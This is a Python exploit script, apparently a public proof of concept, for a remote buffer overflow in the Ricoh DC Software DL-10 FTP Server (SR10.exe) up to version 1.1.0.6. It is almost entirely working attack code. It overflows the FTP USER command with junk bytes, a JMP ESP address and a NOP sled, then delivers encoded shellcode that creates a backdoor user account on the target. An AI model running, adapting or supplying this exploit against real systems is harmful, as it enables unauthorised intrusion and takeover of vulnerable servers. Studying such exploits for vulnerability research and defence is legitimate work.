#!/usr/bin/python

# Exploit Title: Ricoh DC Software DL-10 FTP Server (SR10.exe) <= 1.1.0.6 Remote Buffer Overflow Vulnerability
# Version:       <= 1.1.0.6
# Date:          December 2014
# Author:        jasonsslim
# Homepage:      www.jasonsslim.info
# Tested on:     Windows 2K13
 
import socket,sys
import os
 
target="127.0.0.1"
port=21
 
junk1 = "\x41" * 245
boom = "\x77\xFB\x8B\xAB"    #0x77FB8BAB JMP ESP from ntdll.dll
#junk2 = "\x43" * 50
nops = "\x90" * 10

#msfpayload windows/adduser USER=h4xor PASS=H4xor@1234 R | msfencode -e x86/shikata_ga_nai -b '\x00\x0a\x0d'
#Encoder: x86/shikata_ga_nai succeeded with size 307 (iteration=1)

shellcode = ("\xb8\xf8\x30\x72\xaa\xdb\xc4\xd9\x74\x24\xf4\x5b\x33\xc9" +
"\xb1\x47\x31\x43\x12\x83\xc3\x04\x03\xbb\x3e\x90\x5f\xc7" +
"\xd7\xdd\xa0\x37\x28\xbe\x29\xd2\x19\xec\x4e\x97\x08\x20" +
"\x04\xf5\xa0\xcb\x48\xed\x33\xb9\x44\x02\xf3\x74\xb3\x2d" +
"\x04\xb9\x7b\xe1\xc6\xdb\x07\xfb\x1a\x3c\x39\x34\x6f\x3d" +
"\x7e\x28\x80\x6f\xd7\x27\x33\x80\x5c\x75\x88\xa1\xb2\xf2" +
"\xb0\xd9\xb7\xc4\x45\x50\xb9\x14\xf5\xef\xf1\x8c\x7d\xb7" +
"\x21\xad\x52\xab\x1e\xe4\xdf\x18\xd4\xf7\x09\x51\x15\xc6" +
"\x75\x3e\x28\xe7\x7b\x3e\x6c\xcf\x63\x35\x86\x2c\x19\x4e" +
"\x5d\x4f\xc5\xdb\x40\xf7\x8e\x7c\xa1\x06\x42\x1a\x22\x04" +
"\x2f\x68\x6c\x08\xae\xbd\x06\x34\x3b\x40\xc9\xbd\x7f\x67" +
"\xcd\xe6\x24\x06\x54\x42\x8a\x37\x86\x2a\x73\x92\xcc\xd8" +
"\x60\xa4\x8e\xb6\x77\x24\xb5\xff\x78\x36\xb6\xaf\x10\x07" +
"\x3d\x20\x66\x98\x94\x05\x98\xd2\xb5\x2f\x31\xbb\x2f\x72" +
"\x5c\x3c\x9a\xb0\x59\xbf\x2f\x48\x9e\xdf\x45\x4d\xda\x67" +
"\xb5\x3f\x73\x02\xb9\xec\x74\x07\xda\x7f\xef\x86\x78\x07" +
"\x8a\xf6\xad\x94\x74\x99\xd4\x2e\x55\x10\x64\xab\xe7\xfa" +
"\xe5\x55\x6e\x88\x9c\xfa\x4e\x21\x39\x9a\xfd\xd8\xa6\x22" +
"\x33\x11\x1a\x96\x13\x7a\x1d\x92\x17\xa4\xbb\x3c\xb8\xca" +
"\xa6\x34\x98\x7e\x46\xd7\xb9\x12\xff\x65\x55\x9e\x8f\xa9" +
"\xe8\x04\x1d\xc0\x84\xad\xae\x66\x2b\x4f\x25\xe9\xb9\xfc" +
"\xe5\x9a\x5b\x65\x95\x01\xc7\x49\x76\x88\x43\xce\x88")
 
payload = junk1 + boom + nops + shellcode
 
print "[*] Connecting to Target " + target + "..."
 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect=s.connect((target, port))
    print "[*] Connected to " + target + "!"
except:
    print "[!] " + target + " didn't respond\n"
    sys.exit(0)
     
s.recv(1024)
print "[*] Sending malformed request..."
s.send('USER ' + payload + '\r\n')
 
print "[!] Exploit has been sent!\n"
s.close()
